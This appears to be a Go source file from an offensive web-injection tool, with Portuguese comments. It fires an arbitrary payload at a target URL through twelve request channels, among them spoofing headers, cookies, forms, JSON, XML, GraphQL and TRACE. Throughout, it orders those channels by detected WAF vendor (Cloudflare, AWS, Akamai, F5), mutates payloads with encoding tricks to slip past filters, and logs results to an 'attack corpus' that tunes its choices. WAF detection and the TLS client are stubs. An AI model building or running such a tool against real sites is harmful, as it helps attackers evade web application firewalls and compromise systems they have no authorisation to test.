// utlslocal/injector.go
package utlslocal

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math/rand"
	"mime/multipart"
	"net/http"
	"net/url"
	"os"
	"sort"
	"strings"
	"sync"
	"time"
)

// -----------------------------
// Data Types & Configurations
// -----------------------------

// TelemetryData representa a info enviada para IAbridge/telemetria
type TelemetryData struct {
	Target      string        `json:"target"`
	Payload     string        `json:"payload"`
	Canal       string        `json:"canal"`
	Attempt     int           `json:"attempt"`
	StatusCode  int           `json:"status_code"`
	Latency     time.Duration `json:"latency"`
	Timestamp   time.Time     `json:"timestamp"`
	Err         string        `json:"error,omitempty"`
	Mutation    string        `json:"mutation,omitempty"`
	Fuzz        string        `json:"fuzz,omitempty"`
	WAF         string        `json:"waf,omitempty"`
	AdaptiveTO  time.Duration `json:"adaptive_timeout,omitempty"`
	ContentType string        `json:"content_type,omitempty"`
}

// AttackLogEntry para corpus de treinamento ML
type AttackLogEntry = TelemetryData

// MLModel stubs um modelo leve que pontua canais
type MLModel struct {
	Scores map[string]float64
	mu     sync.RWMutex
}

func (m *MLModel) Score(canal string) float64 {
	m.mu.RLock()
	defer m.mu.RUnlock()
	return m.Scores[canal]
}

func (m *MLModel) Feedback(canal string, success bool) {
	m.mu.Lock()
	defer m.mu.Unlock()
	if success {
		m.Scores[canal] += 1.0
	} else {
		m.Scores[canal] -= 0.5
	}
}

// Globals
var (
	// canais básicos + bônus
	defaultCanais = []string{
		"HEADER", "COOKIE", "POST", "FRAGMENT", "QUERY",
		"MULTIPART", "JSON", "TRACE", "OPTIONS",
		"BODY_RAW", "XML", "GRAPHQL",
	}
	// Headers esotéricos para injeção
	esotericHeaders = []string{
		"X-Original-URL", "X-Rewrite-URL", "X-Http-Method-Override",
		"X-Custom-IP-Authorization", "Forwarded",
	}
	// Preferências por WAF detectado
	wafPreferences = map[string][]string{
		"cloudflare": {"COOKIE", "FRAGMENT", "GRAPHQL"},
		"awswaf":     {"JSON", "MULTIPART"},
		"akamai":     {"HEADER", "TRACE"},
		"f5":         {"QUERY", "OPTIONS"},
	}
	mlModel = LoadMLModel()
	logFile *os.File
)

func init() {
	var err error
	logFile, err = os.OpenFile("attack_corpus.log", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatalf("não conseguiu abrir log file: %v", err)
	}
}

// -----------------------------
// Entry Point
// -----------------------------

// InjectPayload tenta injetar `payload` em `targetURL` por diversos canais concurrentemente,
// adaptando ordem por fingerprint de WAF, ML-feedback, mutações, fuzzing, timeout-adaptive.
func InjectPayload(targetURL, payload string) error {
	parsed, err := url.Parse(targetURL)
	if err != nil {
		return fmt.Errorf("URL inválida: %w", err)
	}
	host := parsed.Host

	// Detectar WAF e priorizar canais
	waf := DetectWAF(host)
	canais := prioritizeCanais(defaultCanais, waf)

	// Adicionar ML-based ordering
	sort.Slice(canais, func(i, j int) bool {
		return mlModel.Score(canais[i]) > mlModel.Score(canais[j])
	})

	// Context para cancelar tentativas após sucesso
	ctx, cancelAll := context.WithCancel(context.Background())
	defer cancelAll()

	type result struct {
		canal   string
		err     error
		success bool
	}
	results := make(chan result, len(canais)*2)
	var wg sync.WaitGroup

	// Para cada canal disparamos até 2 tentativas (com backoff/mutação se falha total)
	for attempt := 1; attempt <= 2; attempt++ {
		for _, canal := range canais {
			wg.Add(1)
			go func(canal string, tentativa int) {
				defer wg.Done()
				select {
				case <-ctx.Done():
					return
				default:
				}
				// Mutação adaptativa na segunda rodada
				mutType := ""
				pld := payload
				if tentativa == 2 {
					pld, mutType = MutatePayload(pld, canal)
				}
				// Geração de variações de fuzz (exemplo mínimo)
				fz := RandomFuzz(pld)
				if fz != "" {
					pld = fz
				}
				start := time.Now()
				status, code, err := tryCanal(ctx, parsed, canal, pld)
				lat := time.Since(start)

				// Adaptive timeout scaling
				adaptiveTO := time.Duration(0)
				if code == 403 && lat > 1500*time.Millisecond {
					adaptiveTO = 2 * time.Second
				}

				// Telemetria e logging
				td := TelemetryData{
					Target:      host,
					Payload:     pld,
					Canal:       canal,
					Attempt:     tentativa,
					StatusCode:  code,
					Latency:     lat,
					Timestamp:   time.Now(),
					Err:         errString(err),
					Mutation:    mutType,
					Fuzz:        fz,
					WAF:         waf,
					AdaptiveTO:  adaptiveTO,
					ContentType: status,
				}
				EnviarTelemetry(td)
				logAttack(td)

				// Feedback para ML
				success := err == nil && code < 400
				mlModel.Feedback(canal, success)

				if success {
					results <- result{canal: canal, success: true}
					cancelAll()
				} else {
					results <- result{canal: canal, success: false, err: err}
				}
			}(canal, attempt)
			// pequeno jitter entre startups
			time.Sleep(time.Duration(rand.Intn(50)) * time.Millisecond)
		}
		wg.Wait()
		// Se já houve sucesso, encerramos
		select {
		case res := <-results:
			if res.success {
				log.Printf("✅ SUCESSO no canal %s\n", res.canal)
				return nil
			}
		default:
		}
		// reversão de ordem para segunda rodada
		reverseSlice(canais)
	}

	return fmt.Errorf("todos os canais falharam para %s", targetURL)
}

// -----------------------------
// Core Request Execution
// -----------------------------

func tryCanal(ctx context.Context, parsed *url.URL, canal, payload string) (contentType string, statusCode int, err error) {
	u := parsed.String()
	var req *http.Request
	var errReq error

	switch canal {
	case "HEADER":
		req, errReq = http.NewRequestWithContext(ctx, "GET", u, nil)
		// Headers padrão + esotéricos
		for _, h := range []string{"X-Injection", "X-Origin-Injection", "X-Forwarded-Host", "Referer"} {
			req.Header.Set(h, payload)
		}
		for _, eh := range esotericHeaders {
			req.Header.Set(eh, payload)
		}
		contentType = "header"

	case "COOKIE":
		req, errReq = http.NewRequestWithContext(ctx, "GET", u, nil)
		enc := base64.StdEncoding.EncodeToString([]byte(payload))
		req.AddCookie(&http.Cookie{Name: "authz", Value: enc})
		contentType = "cookie"

	case "POST":
		form := url.Values{"injection": {payload}}
		req, errReq = http.NewRequestWithContext(ctx, "POST", u, strings.NewReader(form.Encode()))
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		contentType = "form"

	case "FRAGMENT":
		frag := u + "#" + url.QueryEscape(payload)
		req, errReq = http.NewRequestWithContext(ctx, "GET", frag, nil)
		contentType = "fragment"

	case "QUERY":
		q := parsed.Query()
		q.Set("injection", payload)
		parsed.RawQuery = q.Encode()
		req, errReq = http.NewRequestWithContext(ctx, "GET", parsed.String(), nil)
		contentType = "query"

	case "MULTIPART":
		var b bytes.Buffer
		w := multipart.NewWriter(&b)
		_ = w.WriteField("upload", payload)
		w.Close()
		req, errReq = http.NewRequestWithContext(ctx, "POST", u, &b)
		req.Header.Set("Content-Type", w.FormDataContentType())
		contentType = "multipart"

	case "JSON":
		body := fmt.Sprintf(`{"injected":"%s"}`, payload)
		req, errReq = http.NewRequestWithContext(ctx, "POST", u, strings.NewReader(body))
		req.Header.Set("Content-Type", "application/json")
		contentType = "application/json"

	case "TRACE", "OPTIONS":
		req, errReq = http.NewRequestWithContext(ctx, canal, u, nil)
		contentType = canal

	case "BODY_RAW":
		req, errReq = http.NewRequestWithContext(ctx, "POST", u, strings.NewReader(payload))
		req.Header.Set("Content-Type", "application/octet-stream")
		contentType = "octet-stream"

	case "XML":
		x := fmt.Sprintf(`<?xml version="1.0"?><data>%s</data>`, payload)
		req, errReq = http.NewRequestWithContext(ctx, "POST", u, strings.NewReader(x))
		req.Header.Set("Content-Type", "application/xml")
		contentType = "xml"

	case "GRAPHQL":
		q := fmt.Sprintf(`{"query":"{ search(id:\"%s\") }"}`, payload)
		req, errReq = http.NewRequestWithContext(ctx, "POST", u, strings.NewReader(q))
		req.Header.Set("Content-Type", "application/json")
		contentType = "graphql"

	default:
		return "", 0, fmt.Errorf("canal desconhecido: %s", canal)
	}

	if errReq != nil {
		return contentType, 0, errReq
	}

	client := NewHTTPClient(parsed.Host)
	// Timeout adaptativo pode ser ajustado de fora via context ou config
	client.Timeout = 5 * time.Second

	resp, errDo := client.Do(req)
	if errDo != nil {
		return contentType, 0, errDo
	}
	defer resp.Body.Close()
	return contentType, resp.StatusCode, nil
}

// -----------------------------
// Evasão & Mutation & Fuzz
// -----------------------------

// MutatePayload aplica mutação adaptativa por canal
func MutatePayload(payload, canal string) (string, string) {
	switch canal {
	case "HEADER":
		return base64.StdEncoding.EncodeToString([]byte(payload)), "base64"
	case "COOKIE":
		return url.QueryEscape(payload), "url-escape"
	case "JSON":
		key := fmt.Sprintf("k%d", rand.Intn(9999))
		out, _ := json.Marshal(map[string]string{key: payload})
		return string(out), "json-wrap"
	case "QUERY":
		// %uHHHH style
		var b strings.Builder
		for _, r := range payload {
			b.WriteString(fmt.Sprintf("%%u%04X", r))
		}
		return b.String(), "unicode-escape"
	default:
		runes := []rune(payload)
		for i, j := 0, len(runes)-1; i < j; i, j = i+1, j-1 {
			runes[i], runes[j] = runes[j], runes[i]
		}
		return string(runes), "reverse"
	}
}

// RandomFuzz gera variações simples de payload
func RandomFuzz(payload string) string {
	choices := []string{
		payload,
		strings.ReplaceAll(payload, "/", "%2f"),
		strings.ReplaceAll(payload, "/", "%252f"),
	}
	return choices[rand.Intn(len(choices))]
}

// -----------------------------
// Helper & Utilities
// -----------------------------

func errString(err error) string {
	if err == nil {
		return ""
	}
	return err.Error()
}

func reverseSlice(s []string) {
	for i, j := 0, len(s)-1; i < j; i, j = i+1, j-1 {
		s[i], s[j] = s[j], s[i]
	}
}

// prioriza canais por WAF fingerprint
func prioritizeCanais(canais []string, waf string) []string {
	if pref, ok := wafPreferences[waf]; ok {
		seen := map[string]bool{}
		out := make([]string, 0, len(canais))
		// adiciona preferidos na ordem
		for _, c := range pref {
			for _, orig := range canais {
				if c == orig {
					out = append(out, c)
					seen[c] = true
				}
			}
		}
		// depois o resto
		for _, c := range canais {
			if !seen[c] {
				out = append(out, c)
			}
		}
		return out
	}
	return canais
}

// stub de fingerprint de WAF (placeholder)
func DetectWAF(host string) string {
	// TODO: integrar analyzer.go real
	return "cloudflare" // exemplo fixo
}

// Telemetria stub
func EnviarTelemetry(d TelemetryData) {
	j, _ := json.Marshal(d)
	log.Printf("📡 TELEMETRY → %s\n", j)
}

// grava entry no corpus
func logAttack(d TelemetryData) {
	line, _ := json.Marshal(d)
	logFile.Write(append(line, '\n'))
}

// stub de HTTP client baseado em uTLS ou padrão
func NewHTTPClient(host string) *http.Client {
	// TODO: criar client uTLS real
	return &http.Client{}
}

// stub de MLModel loading
func LoadMLModel() *MLModel {
	return &MLModel{Scores: make(map[string]float64)}
}